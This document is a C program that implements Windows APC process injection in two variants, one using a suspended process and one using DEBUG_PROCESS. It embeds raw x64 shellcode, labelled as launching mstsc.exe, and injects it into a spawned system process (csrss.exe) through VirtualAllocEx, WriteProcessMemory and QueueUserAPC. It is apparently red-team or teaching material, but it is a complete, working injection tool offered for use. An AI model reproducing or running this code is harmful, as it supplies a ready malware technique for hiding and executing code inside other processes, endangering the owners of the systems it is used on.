#include <Windows.h>
#include <stdio.h>

/*
- APC Injection requires either a suspended or an alterable thread to execute its payload. 
- It may be difficult to find threads in such state, for that reason we can create a process with SUSPEND and use that handle
*/

/*
There are 2 methods to perform this:
    1 Create process with SUSPENDED flag, 
        write payload to the new target process, 
        get suspended process thread handle along with the payload base address,
        pass them to QueueUserAPC, 
        then resume thread

    2. Create process with DEBUG_PROCESS flag,
        write payload to the address space of the new target process,
        get debugged thread handle from CreateProcess along with the payload base address,
        pass them to QueueUserAPC,
        Stop debugging of the remote process which resumes the thread and executes the payload
*/

#define TARGET_PROCESS		"csrss.exe"

// mstsc.exe
unsigned char Payload[] = 
{
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x6d\x73\x74\x73\x63\x2e\x65\x78\x65\x00"
};


// Function to inject a payload into a remote process
// Parameters:
//   hProcess: Handle to the target process.
//   pPayload: Pointer to the payload data to inject.
//   sPayloadSize: Size of the payload in bytes.
//   ppAddress: Pointer to receive the address of the allocated memory in the remote process.
BOOL InjectPayloadRemoteProcess(HANDLE hProcess, PBYTE pPayload, SIZE_T sPayloadSize, LPVOID* ppAddress) {
    SIZE_T sNumberBytesWritten = 0;
    DWORD dwOldProtection;

    // Allocate memory within the remote process
    *ppAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("[-] VirtualAllocEx Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("\t[+] Allocated Memory At: 0x%p\n", *ppAddress);
    printf("\t[+] Press <Enter> To Write Payload\n");
    getchar();

    // Write the payload to the remote process
    if (!WriteProcessMemory(hProcess, *ppAddress, pPayload, sPayloadSize, &sNumberBytesWritten) || sNumberBytesWritten != sPayloadSize) {
        printf("[-] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Bytes Written: %zu\n", sNumberBytesWritten);

    // Change the memory protection to allow execution of the payload
    if (!VirtualProtectEx(hProcess, *ppAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[-] VirtualProtectEx Failed With Error Code: %d\n", GetLastError());
    }

    return TRUE;
}

// Function to create a new suspended process
// Parameters:
//   lpProcessName: The name of the target process to run and suspend.
//   dwProcessId: A pointer to store the created process's ID.
//   hProcess: A pointer to store the handle to the created process.
//   hThread: A pointer to store the handle to the main thread of the created process.
BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    // Clear the structures to ensure they are empty
    ZeroMemory(&Si, sizeof(STARTUPINFO));
    ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Set the size of the STARTUPINFO structure
    Si.cb = sizeof(STARTUPINFO);

    // Retrieve the Windows directory path
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[+] GetEnvironmentVariableA Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    // Construct the full path of the target process
    sprintf(lpPath, "%s\\System32\\%s\0", WnDr, lpProcessName);
    printf("[+] Running: %s\n", lpPath);

    // Create a new process in a suspended state
    if (!CreateProcessA(
            NULL,
            lpPath,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &Si,
            &Pi)) {
        printf("[!] CreateProcessA Failed with Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Successfully Created Process\n");

    // Populate the output parameters with the created process information
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Check if the pointers are not null
    if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL) {
        return TRUE;
    }

    return FALSE;
}

// Function to create a new process for debugging purposes
// Parameters:
//   lpProcessName: The name of the target process to run and debug.
//   dwProcessId: A pointer to store the created process's ID.
//   hProcess: A pointer to store the handle to the created process.
//   hThread: A pointer to store the handle to the main thread of the created process.
BOOL CreateDebugProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    // Clear the structures to ensure they are empty
    ZeroMemory(&Si, sizeof(STARTUPINFO));
    ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Set the size of the STARTUPINFO structure
    Si.cb = sizeof(STARTUPINFO);

    // Retrieve the Windows directory path
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[+] GetEnvironmentVariableA Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    // Construct the full path of the target process
    sprintf(lpPath, "%s\\System32\\%s\0", WnDr, lpProcessName);
    printf("[+] Running: %s\n", lpPath);

    // Create a new process with DEBUG_PROCESS flag for APC Injection purposes
    if (!CreateProcessA(
            NULL,
            lpPath,
            NULL,
            NULL,
            FALSE,
            DEBUG_PROCESS,
            NULL,
            NULL,
            &Si,
            &Pi)) {
        printf("[!] CreateProcessA Failed with Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Successfully Created Process\n");

    // Populate the output parameters with the created process information
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Check if the pointers are not null
    if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL) {
        return TRUE;
    }

    return FALSE;
}

int main() {
    int num;

    // Prompt the user to select an action
    printf("Select an action:\n");
    printf("1. APC Injection with Suspended Thread.\n");
    printf("2. APC Injection with DEBUG_PROCESS Thread.\n");
    printf("Enter: 1/2: ");
    scanf("%d", &num);

    HANDLE hProcess = NULL, hThread = NULL;
    DWORD dwProcessId = 0;
    PVOID pAddress = NULL;

    switch (num) {
        case 1:
            // Create a suspended process for APC injection
            if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
                printf("[-] CreateSuspendedProcess Failed With Error Code: %d\n", GetLastError());
                return -1;
            }

            printf("[+] Target Process Created with PID: %d\n", dwProcessId);

            printf("[+] Writing Payload to Process...\n");
            if (!InjectPayloadRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
                printf("[-] InjectPayloadRemoteProcess Failed\n");
                return -1;
            }

            printf("[+] Successfully Written Shellcode to Process\n");

            // QueueUserAPC to execute the shellcode
            if (!QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL)) {
                printf("[-] QueueUserAPC Failed\n");
                return -1;
            }

            printf("[+] Press <Enter> To Run Shellcode...\n");
            getchar();

            // Resume the suspended thread to start execution
            if (ResumeThread(hThread) == -1) {
                printf("[-] ResumeThread Failed\n");
                return -1;
            }

            break;
        case 2:
            // Create a Debug process for APC injection
            if (!CreateDebugProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
                printf("[-] CreateDebugProcess Failed With Error Code: %d\n", GetLastError());
                return -1;
            }

            printf("[+] Target Process Created with PID: %d\n", dwProcessId);

            printf("[+] Writing Payload to Process...\n");
            if (!InjectPayloadRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
                printf("[-] InjectPayloadRemoteProcess Failed\n");
                return -1;
            }
            printf("[+] Successfully Written Shellcode to Process\n");

            // QueueUserAPC to execute the shellcode
            if (!QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL)) {
                printf("[-] QueueUserAPC Failed\n");
                return -1;
            }

            printf("[+] Press <Enter> To Run Shellcode...\n");
            getchar();

            // Detach the debugger from the target process
            printf("[i] Detaching The Target Process ... \n");
            if (DebugActiveProcessStop(dwProcessId)) {
                printf("[+] Process Detached Successfully\n");
            } else {
                printf("[-] DebugActiveProcessStop Failed %d \n", GetLastError());
                return -1;
            }

            break;
        default:
            printf("Invalid choice. Exiting program.\n");
            break;
    }

    printf("[+] Press <Enter> To Quit...\n");
    getchar();

    // Close handles to release resources
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
